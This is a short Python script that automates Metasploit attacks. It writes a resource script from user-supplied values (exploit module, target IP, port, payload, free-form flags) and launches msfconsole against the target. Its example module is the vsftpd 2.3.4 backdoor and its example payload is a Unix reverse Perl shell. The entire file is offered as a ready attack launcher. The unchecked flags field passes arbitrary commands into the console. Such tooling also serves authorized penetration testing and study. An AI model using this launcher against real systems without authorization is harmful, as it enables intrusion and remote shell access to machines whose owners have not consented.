import subprocess
import logging

def run_exploit(target_ip, rport, exploit_module=None, payload=None, flags=None):
    """
    Run customizable Metasploit exploit with user-defined options.
    Args:
        target_ip (str): Target IP address.
        rport (int): Remote port to target.
        exploit_module (str): Metasploit exploit module (e.g., 'exploit/unix/ftp/vsftpd_234_backdoor').
        payload (str): Metasploit payload (e.g., 'payload/unix/reverse_perl').
        flags (str): Additional Metasploit flags (optional).
    """
    exploit_module = exploit_module or input("Enter exploit module (e.g., exploit/unix/ftp/vsftpd_234_backdoor): ")
    payload = payload or input("Enter payload (e.g., payload/unix/reverse_perl): ")
    
    # Generate the Metasploit resource script
    with open('exploit.rc', 'w') as file:
        file.write(f"use {exploit_module}\n")
        file.write(f"set RHOST {target_ip}\n")
        file.write(f"set RPORT {rport}\n")
        file.write(f"set PAYLOAD {payload}\n")
        if flags:
            file.write(f"{flags}\n")
        file.write("exploit -j\n")

    try:
        command = ['msfconsole', '-r', 'exploit.rc']
        print(f"Running exploit: {exploit_module} with payload: {payload} on {target_ip}:{rport}")
        result = subprocess.run(command, capture_output=True, text=True, timeout=1200)
        print(result.stdout)
        logging.info(f"Exploit results: {result.stdout}")
    except subprocess.TimeoutExpired:
        print(f"Exploit with {exploit_module} on {target_ip} timed out.")
        logging.error("Exploit timed out.")
    except Exception as e:
        print(f"An error occurred: {e}")
        logging.error(f"Exploit failed with error: {e}")

if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    rport = int(input("Enter the target port: "))
    exploit_module = input("Enter exploit module (optional): ")
    payload = input("Enter payload (optional): ")
    flags = input("Enter additional Metasploit flags (optional): ")

    run_exploit(target_ip, rport, exploit_module, payload, flags)
